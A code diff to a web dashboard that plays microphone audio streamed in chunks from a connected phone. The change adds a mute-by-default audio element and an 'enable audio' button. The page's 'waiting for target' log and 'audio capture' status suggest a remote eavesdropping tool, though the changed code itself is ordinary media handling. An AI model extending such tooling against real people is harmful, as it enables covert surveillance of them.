@@ -235,7 +235,10 @@
     <div class="mic-visualizer" id="visualizer">
       <!-- bars injected by JS -->
     </div>
-    <audio id="remoteAudio" autoplay></audio>
+    <audio id="remoteAudio" autoplay muted></audio>
+    <button id="unmuteBtn" onclick="unmuteAudio()" style="display:none;width:100%;margin:8px 0;background:var(--red);border:none;color:#fff;font-family:'Share Tech Mono',monospace;font-size:.8rem;padding:8px;border-radius:2px;cursor:pointer;letter-spacing:2px;animation:pulse 1s infinite;">
+      🔊 CLICK TO ENABLE AUDIO
+    </button>
     <div class="mic-status" id="micInfo">Connect phone to begin audio capture</div>
     <div class="log" id="log">
       <div class="log-entry warn">[SYSTEM] Dashboard initialized. Waiting for target...</div>
@@ -495,6 +498,14 @@
     ]
   };
 
+  function unmuteAudio() {
+    const audio = document.getElementById('remoteAudio');
+    audio.muted = false;
+    audio.play().catch(e => addLog('Play error: ' + e.message, 'err'));
+    document.getElementById('unmuteBtn').style.display = 'none';
+    addLog('Audio unmuted ✓', 'ok');
+  }
+
   // ── Audio via socket chunks (replaces WebRTC) ─────────────────
   let mediaSource = null;
   let sourceBuffer = null;
@@ -536,13 +547,21 @@
     }
   }
 
+  let audioStarted = false;
   socket.on('p3-audio-chunk', (chunk) => {
     if (!mediaSource) initAudio();
     const buf = chunk instanceof ArrayBuffer ? chunk : chunk.buffer;
     audioQueue.push(buf);
     processQueue();
 
-    // Animate visualizer bars randomly to show activity
+    // Show unmute button on first chunk
+    if (!audioStarted) {
+      audioStarted = true;
+      document.getElementById('unmuteBtn').style.display = 'block';
+      addLog('Audio chunks arriving — click ENABLE AUDIO', 'warn');
+    }
+
+    // Animate visualizer bars
     const bars = document.querySelectorAll('.bar');
     bars.forEach(b => {
       b.style.height = Math.max(4, Math.random() * 50) + 'px';
